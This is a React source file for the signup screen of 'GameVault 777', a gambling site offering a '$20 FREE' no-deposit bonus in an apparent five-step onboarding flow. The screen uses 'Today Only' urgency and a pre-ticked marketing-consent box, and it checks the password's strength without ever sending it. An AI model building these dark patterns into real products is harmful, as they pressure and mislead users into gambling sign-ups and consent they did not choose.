"use client";

import { useEffect, useState } from "react";

// ① SIGN UP
export function SignupScreen({ isActive, onNext, setUserData }) {
  const [passwordStats, setPasswordStats] = useState({
    strength: 0,
    fill: "0",
    color: "transparent",
    label: "Enter a password",
  });
  const [emailState, setEmailState] = useState({
    value: "",
    valid: false,
    touched: false,
  });
  const [agreed, setAgreed] = useState(false);
  const [marketing, setMarketing] = useState(true);

  const handlePassword = (e) => {
    const v = e.target.value;
    if (!v.length) {
      setPasswordStats({
        strength: 0,
        fill: "0",
        color: "transparent",
        label: "Enter a password",
        colorStr: "var(--text-dim)",
      });
      return;
    }
    const s =
      (v.length >= 8 ? 1 : 0) +
      (v.length >= 12 ? 1 : 0) +
      (/[A-Z]/.test(v) ? 1 : 0) +
      (/[0-9]/.test(v) ? 1 : 0) +
      (/[^a-zA-Z0-9]/.test(v) ? 1 : 0);
    const i = Math.min(s, 4);
    const pcts = ["20%", "40%", "60%", "80%", "100%"];
    const cols = ["#EF4444", "#F97316", "#EAB308", "#22C55E", "#22C55E"];
    const labels = ["Too weak", "Weak", "Fair", "Strong", "Very strong"];
    setPasswordStats({
      strength: s,
      fill: pcts[i],
      color: cols[i],
      label: labels[i],
      colorStr: cols[i],
    });
  };

  const handleEmailBlur = (e) => {
    const v = e.target.value;
    const valid = v.includes("@") && v.includes(".");
    setEmailState({ value: v, valid, touched: true });
  };

  const submitSignup = async () => {
    const fname = document.getElementById("inp-fname")?.value.trim() || "";
    const lname = document.getElementById("inp-lname")?.value.trim() || "";
    const email = document.getElementById("inp-email")?.value.trim() || "";
    const country = document.getElementById("inp-country")?.value || "US";

    if (!fname || !lname || !email || !email.includes("@")) {
      alert("Please fill all required fields correctly.");
      return;
    }
    if (!agreed) {
      alert("Please accept the Terms of Service.");
      return;
    }

    const btn = document.getElementById("signupBtn");
    if (btn) {
      btn.disabled = true;
      btn.innerHTML = '<i class="ph-bold ph-spinner ph-spin" style="margin-right:4px;"></i> Creating account...';
    }

    const signupData = { fname, lname, email, country, timestamp: Date.now() };
    if (setUserData) setUserData(signupData);

    try {
      await fetch("/api/auth/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(signupData),
      });

      // Fire Live Event
      fetch("/api/events", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: signupData.email,
          action: `Account Created (${signupData.country})`,
          emoji: "✨"
        })
      });
    } catch (e) {
      console.error(e);
    }

    onNext();
  };

  return (
    <div className={`screen ${isActive ? "active" : ""}`} id="screen-signup">
      <div className="topbar">
        <a className="brand" href="#">
          <img src="/logo.png" alt="Game Vault 777" className="brand-logo" />
          <div className="brand-name">GameVault 777</div>
        </a>
      </div>
      <div className="flow-bar">
        <div className="fseg active"></div>
        <div className="fseg"></div>
        <div className="fseg"></div>
        <div className="fseg"></div>
        <div className="fseg"></div>
      </div>
      <div className="flow-lbl">
        <span className="fl active">Sign Up</span>
        <span className="fl">Processing</span>
        <span className="fl">Activating</span>
        <span className="fl">Security</span>
        <span className="fl">Verify</span>
      </div>
      <div className="content">
        <div className="su-badge" style={{ marginTop: "8px" }}>
          <i className="ph-fill ph-slots" style={{ fontSize: "14px" }}></i> Join
          Game Vault 777
        </div>
        <div className="su-title">
          Create your free account
          <br />
          <span className="g">& claim $20 bonus</span>
        </div>
        <p className="su-sub">
          Join 2 million players. No deposit required to get started.
        </p>
        <div className="bonus-card">
          <div className="bc-icon">
            <img
              src="dollar.png"
              alt="Dollar"
              style={{ width: "36px", height: "36px", objectFit: "contain" }}
            />
          </div>
          <div className="bc-info">
            <div className="bc-lbl">Welcome Bonus</div>
            <div className="bc-amt">$20 FREE</div>
            <div className="bc-desc">
              No deposit needed — credited on signup
            </div>
          </div>
          <div className="bc-badge">
            <i
              className="ph-fill ph-fire"
              style={{ marginRight: "2px", fontSize: "12px" }}
            ></i>{" "}
            Today Only
          </div>
        </div>
        <div className="form">
          <div className="form-row">
            <div className="field">
              <label className="lbl">First Name</label>
              <input
                className="inp"
                id="inp-fname"
                type="text"
                placeholder="John"
                autoComplete="given-name"
              />
              <div className="err-msg" id="err-fname">
                Required
              </div>
            </div>
            <div className="field">
              <label className="lbl">Last Name</label>
              <input
                className="inp"
                id="inp-lname"
                type="text"
                placeholder="Smith"
                autoComplete="family-name"
              />
              <div className="err-msg" id="err-lname">
                Required
              </div>
            </div>
          </div>
          <div className="field">
            <label className="lbl">Email Address</label>
            <div className="inp-wrap">
              <input
                className={`inp ${emailState.touched ? (emailState.valid ? "ok" : "err") : ""}`}
                id="inp-email"
                type="email"
                placeholder="john@email.com"
                autoComplete="email"
                style={{ paddingRight: "40px" }}
                onBlur={handleEmailBlur}
              />
              <div
                className="inp-icon"
                id="email-icon"
                style={{
                  display: emailState.touched ? "flex" : "none",
                  color: emailState.valid ? "var(--green)" : "var(--red)",
                }}
              >
                <i
                  className={`ph-bold ${emailState.valid ? "ph-check" : "ph-x"}`}
                ></i>
              </div>
            </div>
            <div className="err-msg" id="err-email">
              Enter a valid email
            </div>
          </div>
          <div className="field">
            <label className="lbl">Password</label>
            <input
              className="inp"
              id="inp-pwd"
              type="password"
              placeholder="Create a strong password"
              autoComplete="new-password"
              onInput={handlePassword}
            />
            <div className="pwd-bar">
              <div
                className="pwd-fill"
                id="pwd-fill"
                style={{
                  width: passwordStats.fill,
                  background: passwordStats.color,
                }}
              ></div>
            </div>
            <div
              className="pwd-lbl"
              id="pwd-lbl"
              style={{ color: passwordStats.colorStr }}
            >
              {passwordStats.label}
            </div>
            <div className="err-msg" id="err-pwd">
              Min 8 characters
            </div>
          </div>
          <div className="field">
            <label className="lbl">Country</label>
            <select
              className="inp"
              id="inp-country"
              style={{ cursor: "pointer" }}
              defaultValue="US"
            >
              <option value="">Select your country</option>
              <option value="US">🇺🇸 United States</option>
              <option value="GB">🇬🇧 United Kingdom</option>
              <option value="CA">🇨🇦 Canada</option>
              <option value="AU">🇦🇺 Australia</option>
              <option value="NZ">🇳🇿 New Zealand</option>
              <option value="IE">🇮🇪 Ireland</option>
              <option value="other">🌍 Other</option>
            </select>
          </div>
          <label
            className="chk-row"
            onClick={(e) => {
              e.preventDefault();
              setAgreed(!agreed);
            }}
          >
            <div className={`chk-box ${agreed ? "checked" : ""}`} id="tos-chk">
              {agreed && (
                <i
                  className="ph-bold ph-check"
                  style={{ fontSize: "10px" }}
                ></i>
              )}
            </div>
            <span>
              I agree to the <a href="#">Terms of Service</a> and{" "}
              <a href="#">Privacy Policy</a>. I confirm I am 21+ years of age.
            </span>
          </label>
          <label
            className="chk-row"
            onClick={(e) => {
              e.preventDefault();
              setMarketing(!marketing);
            }}
          >
            <div
              className={`chk-box ${marketing ? "checked" : ""}`}
              id="mkt-chk"
            >
              {marketing && (
                <i
                  className="ph-bold ph-check"
                  style={{ fontSize: "10px" }}
                ></i>
              )}
            </div>
            <span>Send me exclusive bonuses and promotional offers</span>
          </label>
          <button className="primary-btn" id="signupBtn" onClick={submitSignup}>
            <i className="ph-fill ph-slots" style={{ marginRight: "4px" }}></i>{" "}
            &nbsp;Create Free Account
          </button>
          <div className="login-link">
            Already have an account? <a href="#">Sign in</a>
          </div>
        </div>
      </div>
    </div>
  );
}
